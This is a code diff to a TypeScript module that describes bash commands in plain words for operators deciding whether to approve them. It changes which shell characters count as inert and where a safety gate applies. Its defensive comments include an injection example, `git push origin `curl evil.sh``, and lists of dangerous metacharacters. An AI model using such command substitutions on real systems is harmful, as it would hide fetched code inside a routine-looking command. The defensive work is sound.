@@ -1,5 +1,5 @@
 import { parseShell, type ShellStage } from './parse-shell';
-import { CALM_RULE_IDS, type PlainDescription, unknownDescription } from './types';
+import { type PlainDescription, unknownDescription } from './types';
 
 export interface BashIntel {
   intent?: string;
@@ -36,28 +36,38 @@ const UNSEEN_SCRIPT_WARNING = "I can't see what is inside that script.";
  * entry in the read list. No list of bad shapes stays complete against that,
  * so we enumerate what is permitted and refuse everything else.
  *
- * Permitted, and why none of them can start a subshell, a redirect, a glob,
- * or a second command:
+ * Permitted, and why none of them can start a subshell, a redirect, or a
+ * second command:
  *   A-Z a-z 0-9  plain words
- *   space        separates words
+ *   space tab    separate words; a tab is a shell blank, never a separator
  *   - _          flags and identifiers (-la, my_file)
  *   . /          paths (./src/app.ts)
  *   = , :        flag values, lists, host:port (--depth=1)
  *   ' "          quoting, which is inert once $ and ` are excluded, since
  *                command substitution needs one of those two
+ *   ~            tilde expansion is purely textual and yields a path
+ *   * ?          pathname expansion matches names of EXISTING files only,
+ *                and bash does not re-parse the result for metacharacters
  *
- * Everything else is refused, including $ ( ) ` < > { } [ ] * ? ~ ! \ ; | &
- * and any newline, carriage return or tab. Excluded even though they look
- * harmless: ~ (home expansion), + % @ (no rule needs them) and # (starts a
- * comment, which hides the rest of the line). Erring narrow is the point —
- * a refused sentence costs an operator a careful read; a wrong one costs
- * them the thing the product exists to protect.
+ * THE LOAD-BEARING CONDITION for admitting ~ * and ?: no binary in the read
+ * list below has a write flag, so expanding a glob to more paths only widens
+ * what is read. That breaks the moment anyone adds sed, tee, sort, awk or
+ * find to that list — a glob would then choose what gets written. Re-check
+ * this comment before touching the read list.
+ *
+ * Everything else is refused, including $ ( ) ` < > { } [ ] ! \ ; | & # and
+ * any newline or carriage return. Extended globs such as `?(...)` and `!(x)`
+ * stay refused because they need parentheses. Excluded though they look
+ * harmless: + % @ (no rule needs them) and # (starts a comment, which hides
+ * the rest of the line). Erring narrow is the point — a refused sentence
+ * costs an operator a careful read; a wrong one costs them the thing the
+ * product exists to protect.
  *
  * Expressed as its complement so the test is exact: `$` in a JS regex also
  * matches before a trailing newline, which would let `'ls -la\n'` pass an
  * anchored allow-list.
  */
-const NON_INERT_CHARACTER = /[^A-Za-z0-9 \-_./=,:'"]/;
+const NON_INERT_CHARACTER = /[^A-Za-z0-9 \t\-_./=,:'"~*?]/;
 
 function hasInertShape(text: string): boolean {
   return !NON_INERT_CHARACTER.test(text);
@@ -107,14 +117,27 @@ function hasFlag(stage: ShellStage, ...names: string[]): boolean {
  * Scans flags AND operands: parse-shell routes any token starting with '-'
  * into flags, so a redirect glued to a short flag (`ls -la>out.txt`) arrives
  * as one flag token and an operand-only scan never sees it.
+ *
+ * @internal Exported only so this can be tested directly. No input reaches it
+ * past the entry shape gate (a '>' is refused there), so its behaviour is not
+ * observable through describeBash and a test through that door would pass
+ * even if this function were reverted to its broken, operand-only form.
  */
-function hasRedirection(stage: ShellStage): boolean {
+export function hasRedirection(stage: ShellStage): boolean {
   return [...stage.flags, ...stage.operands].some((t) => t.includes('>'));
 }
 
 /** Returns null when the stage is not recognised. Null is a valid outcome. */
 function describeStage(stage: ShellStage): Clause | null {
   const { binary, subcommand } = stage;
+
+  // The shape gate sits at the entry, once, so EVERY rule below is covered by
+  // it. Put on the read branch alone it would leave the same root cause live
+  // on the others: `git push origin `curl evil.sh`` is the sharpest of them,
+  // because the substitution leaves no trace in the sentence and the result
+  // is a familiar, low-alarm claim at high confidence with no warning. None
+  // of those rule ids is calm, so applySafetyFloor would not catch it either.
+  if (!hasInertShape(stage.raw)) return null;
 
   if (binary === 'git' && subcommand === 'push') {
     if (hasFlag(stage, '--force', '--force-with-lease', '-f')) {
@@ -182,18 +205,16 @@ function describeStage(stage: ShellStage): Clause | null {
     return { text: 'Runs a command against your database', warnings: [], ruleId: 'bash.sql' };
   }
 
+  // NOTHING IN THIS LIST MAY HAVE A WRITE FLAG. The allow-list admits the
+  // glob characters * and ? on exactly that condition — see the LOAD-BEARING
+  // CONDITION note on NON_INERT_CHARACTER before adding sed, tee, sort, awk
+  // or find here. `find` is deliberately absent already: it takes -delete and
+  // -exec, so it is not read-only and we cannot cheaply prove otherwise.
   if (['ls', 'cat', 'pwd', 'head', 'tail', 'wc', 'which', 'echo', 'grep'].includes(binary)) {
-    // None of these mutates state through its own flags, but that is not the
-    // question: the shell expands the arguments first, so only a boringly
-    // shaped stage may claim to read. Anything else refuses rather than
-    // reassures. See NON_INERT_CHARACTER.
-    if (!hasInertShape(stage.raw)) return null;
-    // Redundant against the shape gate above (a '>' is already refused), and
+    // Redundant against the entry shape gate (a '>' is already refused), and
     // kept anyway as the narrower, independently correct guard: if the shape
     // gate is ever relaxed, redirection coverage must not vanish with it.
     if (hasRedirection(stage)) return null;
-    // `find` is deliberately absent from the list — it takes -delete and
-    // -exec, so it is not read-only and we cannot cheaply prove otherwise.
     return { text: 'Reads information from your computer', warnings: [READ_ONLY_WARNING], ruleId: 'bash.read' };
   }
 
@@ -306,13 +327,16 @@ export function describeBash(command: string, bashIntel?: BashIntel): PlainDescr
   // keeps its two consumers below from drifting apart, as they did in round 3.
   const soleClause = complete && known.length === 1 ? known[0] : undefined;
 
-  // The shape gate applied a second time, now to the WHOLE raw command rather
-  // than to the one stage we described, so nothing outside that stage can
-  // leave a reassurance standing.
-  const inertShape = hasInertShape(command);
-
-  // Sounding calm is a promise about the whole command, not about one stage.
-  const calmEligible = soleClause !== undefined && inertShape;
+  // Deliberately NOT also gated on the shape of the whole raw command. For
+  // soleClause to exist there must be exactly one recognised stage AND the
+  // command must be complete, so the only text outside that stage is
+  // separators and whitespace — never a payload. A whole-command gate here
+  // could therefore never prevent a lie, and it did active harm: a trailing
+  // separator (`ls -la;`, `ls -la\n`) pushed a still-calm headline onto the
+  // non-calm id bash.sequence, which BLINDED applySafetyFloor, since the
+  // floor only polices CALM_RULE_IDS. The per-stage gate at describeStage's
+  // entry does the safety work; this keeps the calm id so the floor can fire.
+  const calmEligible = soleClause !== undefined;
 
   const text = known.map((c) => c.text).join(', then ');
   const warnings = [...new Set(known.flatMap((c) => c.warnings))]
@@ -326,16 +350,8 @@ export function describeBash(command: string, bashIntel?: BashIntel): PlainDescr
     warnings.unshift("There is more in this command that I can't read. Check it below before approving.");
   }
 
-  // calmEligible's condition with one exception: a rule id that was never
-  // calm to begin with (bash.rm, bash.pipe-to-shell) promises the operator
-  // nothing, so it keeps its own identity even when the shape gate closes
-  // the calm path. Only a CALM_RULE_IDS member is suppressed by the shape.
-  const ruleId =
-    soleClause !== undefined && (inertShape || !CALM_RULE_IDS.has(soleClause.ruleId))
-      ? soleClause.ruleId
-      : complete
-        ? 'bash.sequence'
-        : 'bash.partial';
+  // Same single condition as calmEligible, so the two cannot drift apart.
+  const ruleId = soleClause !== undefined ? soleClause.ruleId : complete ? 'bash.sequence' : 'bash.partial';
 
   return {
     headline: complete ? `${text}.` : `${text}. There is more here I can't read.`,
